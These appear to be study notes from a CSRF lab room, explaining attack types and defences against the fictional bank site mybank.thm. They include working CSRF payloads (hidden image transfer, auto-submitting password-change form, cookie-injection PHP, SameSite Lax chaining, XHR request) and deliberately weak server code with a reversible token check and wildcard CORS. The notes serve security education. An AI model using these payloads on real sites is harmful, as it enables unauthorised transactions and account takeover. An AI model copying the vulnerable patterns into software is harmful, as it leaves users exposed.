# TASK 2: Overview of CSRF Attack

CSRF (Cross‑Site Request Forgery) is a vulnerability where an attacker causes a user's browser to send authenticated requests to a trusted site (the browser includes cookies automatically), letting the attacker perform actions on the user's behalf via malicious HTML or JavaScript.

A CSRF attack typically follows three steps:
1. Attacker learns the target request format and crafts a malicious link/page.
2. Victim, already authenticated to the target site, interacts (click, image load, etc.).
3. Browser sends credentials; the server accepts the forged request due to missing CSRF checks.

**Phases of CSRF**

Server-side checks are insufficient, so the application can't distinguish forged requests from legitimate ones.

**Effects of CSRF**

- Unauthorised actions: change passwords, email, or perform transactions.
- Exploits trust: uses the site's trust in the user's browser state.
- Stealthy: operates via normal browser behavior and is often unnoticed.

**Mitigation:** use CSRF tokens, SameSite cookies, and validate Origin/Referer headers.

---

# TASK 3: Types of CSRF Attack

## Traditional CSRF
Conventional CSRF tricks an authenticated user's browser into submitting state-changing requests (e.g., money transfer, change account settings) by forging form submissions or links. The browser includes credentials so the server executes the action if CSRF protections are missing.

**Example steps:**
1. Victim is logged into a site (e.g., bank).
2. Attacker crafts a malicious link/form and lures the victim to trigger it.
3. Victim's browser sends the authenticated request; the server performs the action.

## XMLHttpRequest CSRF
Asynchronous CSRF uses AJAX (XMLHttpRequest/Fetch) to send forged requests without full page reloads. It exploits the same trust in browser credentials but via script-driven calls.

**Example steps:**
1. Victim is authenticated to a web app using cookies.
2. Attacker hosts a page with script that issues an AJAX POST/GET to the target API.
3. The browser includes session cookies; the target processes the request if no CSRF defenses exist.

## Flash-based CSRF
Legacy technique where malicious Flash (.swf) files issue cross-site requests using the victim's browser context. With Flash deprecated, this mainly affects older systems still running Flash components.

**Example:**
- A malicious SWF on an attacker site sends requests to a target site; the target treats them as legitimate if CSRF protections are absent.

---

# TASK 4: Basic CSRF - Hidden Link/Image Exploitation

Hidden link/image CSRF uses invisible elements (0x0 img or a disguised link) to make a victim's browser send authenticated requests (cookies included) to a target site without the user's intent.

**How it works**
1. Attacker crafts a request URL that performs an action (e.g., transfer).
2. Victim, authenticated to the bank, visits the attacker page containing a hidden image or lure link.
3. Browser requests the URL with session cookies; server performs the action if no CSRF protection exists.

**Attack examples**

```html
<!-- Hidden image triggers a GET transfer -->
<img src="http://mybank.thm:8080/transfer.php?to_account=GB82MYBANK5698&amount=1000" width="0" height="0" alt="">
```

```html
<!-- Visible lure -->
<a href="http://mybank.thm:8080/transfer.php?to_account=GB82MYBANK5698&amount=1000" target="_blank">Click here to claim prize</a>
```

Vulnerable form (server accepts requests without CSRF checks)

---

# TASK 5: Double Submit Cookie Bypass

Double Submit Cookie Bypass (concise)

We've observed that without strong CSRF tokens, the app is vulnerable. Double Submit Cookies pairs a cookie value with a hidden form field; the server accepts the request if they match.

**How it works**
- Token generation: server issues a CSRF token stored as a cookie and embedded in forms.
- User action: user submits a form containing the hidden token.
- Server validation: server compares cookie value with form value; if equal, request is allowed.

**Common bypass scenarios (short)**
- Session cookie hijack or XSS (attacker reads tokens).
- Attacker-controlled subdomain can set cookies for parent domain.
- Predictable/insecure token generation.

**Attack example (compact)**
- Attacker reverses a weak token (e.g., base64(account_number)).
- Attacker controls attacker.mybank.thm and can set a cookie for mybank.thm.
- Attacker crafts a page that sets the cookie, hosts a form pointing to the real change password endpoint, and auto-submits it.

**Attacker page (auto-submit form):**

```html
<form method="post" action="http://mybank.thm:8080/changepassword.php" id="autos">
    <label>Password:</label>
    <input type="password" name="current_password" value="GB82MYBANK5697" required>
    <label>Confirm:</label>
    <input type="password" name="confirm_password" value="AttackerPassword" required>
    <input type="hidden" name="csrf_token" value="Decrypted_Token_Value">
    <button type="submit" id="password_submit">Update Password</button>
</form>
<script>document.getElementById('password_submit').click();</script>
```

**Attacker sets cookie for parent domain (PHP):**

```php
<?php
setcookie(
    'csrf-token',
    base64_encode("GB82MYBANK5699"),
    [
        'expires' => time() + 365*24*60*60,
        'path' => '/',
        'domain' => 'mybank.thm',
        'secure' => false,
        'httponly' => false,
        'samesite' => 'Lax'
    ]
);
?>
```

**Server-side check (simplified):**

```php
<?php
if (base64_decode($_POST['csrf_token']) === base64_decode($_COOKIE['csrf-token'])) {
    $currentPassword = $_POST['current_password'];
    $newPassword = $_POST['confirm_password'];
    // Update password...
}
?>
```

**Result:** if token generation is reversible and attacker can set the cookie, the double-submit check is bypassed. 
**Mitigation:** use secure, unpredictable tokens, HttpOnly cookie where appropriate, validate Origin/Referer, and bind tokens to server-side state.

---

# TASK 6: Samesite Cookie Bypass

SameSite cookies are a key defense against CSRF. The SameSite attribute controls when cookies are sent with cross-site requests. Lax allows some cross-site GETs; None is for cross-origin use but must be Secure.

**Different Types of SameSite Cookies**
- Lax: Sent with top-level navigation and safe HTTP methods (GET, HEAD, OPTIONS); blocks cookies on cross-site POST requests.
- Strict: Only sent in a first-party context; blocks cookies on all cross-site requests.
- None: Sent with all requests (first-party and cross-site); must be Secure if used over HTTPS.

**The Lax Exploit Adventure**

Attacker's goal: log Josh out by exploiting the Lax SameSite cookie. The logout cookie is set as Lax, so it is sent with top-level navigation GET requests. The attacker sends Josh a survey link:

```html
<a href="https://mybank.thm:8080/logout.php" target="_blank">Survey Link!</a>
```

When Josh clicks, his browser sends the logout cookie, and the server logs him out.

**What was the missing link?**

The attack succeeded because the cookie was set with SameSite=Lax, not Strict. If Strict was used, the browser would block the cookie in cross-site requests. Always review cookie attributes for security gaps.

**Lax with POST Scenario - Chaining the Exploit**

SameSite=Lax cookies block cross-site POST requests, but Chrome allows cookies set/modified in the last 2 minutes to be sent with such requests. This creates a brief window for CSRF attacks.

**Example exploit:**
1. User logs out (cookie is updated).
2. Within 2 minutes, attacker triggers a POST request (e.g., via hidden form) to change the isBanned cookie value.

**Attack code:**

```html
<script>
function launchAttackSuccess(){
    let win = window.open("http://mybank.thm:8080/logout.php",'');
    setTimeout(function(){win.close();bank.submit()},1000)
}
</script>
<form style="display:none" name="bank" method="post" action="http://mybank.thm:8080/index.php">
    <input name="isBanned" value="true">
    <input type="submit">
</form>
```

**Mitigation:** Set SameSite=Strict and avoid updating sensitive cookies on logout/login.

---

# TASK 7: Few Additional Exploitation Techniques

## XMLHttpRequest Exploitation
AJAX-based CSRF tricks a user's browser into sending authenticated requests via JavaScript, allowing attackers to perform actions on behalf of the user even with Same-Origin Policy in place.

Here's a sample attack that updates a password on mybank.thm using an asynchronous request.

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://mybank.thm/updatepassword', true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            alert("Action executed!");
        }
    };
    xhr.send('action=execute&parameter=value');
</script>
```

The XMLHttpRequest in the above code is designed to submit form data to the server and include custom headers. The complete process of sending requests will be seamless as the requests are performed in Javascript using AJAX. 

## Same Origin Policy (SOP) and Cross-Origin Resource Sharing (CORS) Bypass
CORS/SOP bypass lets attackers trick browsers into sending cross-site requests. Weak or misconfigured CORS policies can allow CSRF if untrusted origins are permitted or credentials are sent cross-origin.

```php
<?php // Server-side code (PHP)
header('Access-Control-Allow-Origin: *'); 
// Allow requests from any origin (vulnerable CORS configuration) .
..// code to update email address ?>
```

This PHP snippet is vulnerable to CSRF due to Access-Control-Allow-Origin: *. Allowing all origins without CSRF protection exposes sensitive actions. Never use Access-Control-Allow-Origin: * with credentials. Restrict origins and implement CSRF defenses.

## Referer Header Bypass
Some sites use the Referer header to block CSRF, only accepting requests if the header matches their domain. This is weak, as the header can be missing or manipulated by privacy tools or browser settings.

---

# TASK 8: Defence Mechanisms

## Pentesters/Red Teamers
- CSRF Testing: Attempt unauthorised actions to check for CSRF vulnerabilities and test the effectiveness of protections.
- Token Validation: Ensure anti-CSRF tokens are present, unpredictable, and properly verified.
- Security Headers: Check for proper use of CORS, Referer, and other headers to prevent CSRF.
- Session Management: Confirm session tokens are securely generated and validated.
- Exploitation Scenarios: Simulate common CSRF attacks (e.g., hidden forms, image tags) to identify weaknesses.

## Secure Coders
- Anti-CSRF Tokens: Add unique tokens to forms; server verifies them to block forged requests.
- SameSite Cookie Attribute: Set cookies to 'Strict' or 'Lax' to limit cross-site use.
- Referrer Policy: Restrict referer headers to ensure requests come from trusted sites.
- Content Security Policy (CSP): Limit allowed sources for scripts and content.
- Double-Submit Cookie Pattern: Match a token in both cookie and form to verify requests.
- CAPTCHAs: Use CAPTCHAs to block automated CSRF attempts.

---

# Appendix